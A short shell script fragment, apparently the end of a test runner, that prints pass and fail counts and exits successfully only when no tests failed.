echo "=== Results ==="
echo "Passed: $PASS"
echo "Failed: $FAIL"
[ "$FAIL" -eq 0 ]
